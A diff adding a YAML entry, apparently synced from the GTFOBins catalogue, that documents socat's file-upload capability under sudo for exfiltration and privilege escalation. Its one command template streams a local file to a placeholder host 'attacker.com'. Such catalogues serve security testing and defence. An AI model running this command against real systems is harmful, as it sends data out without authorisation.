@@ -1,0 +1,24 @@
+id: gtfobins/socat/upload/sudo
+type: binary
+platform: linux
+name: socat
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
+references:
+- https://gtfobins.github.io/gtfobins/socat/
+tags:
+- linux
+- unix
+- gtfobins
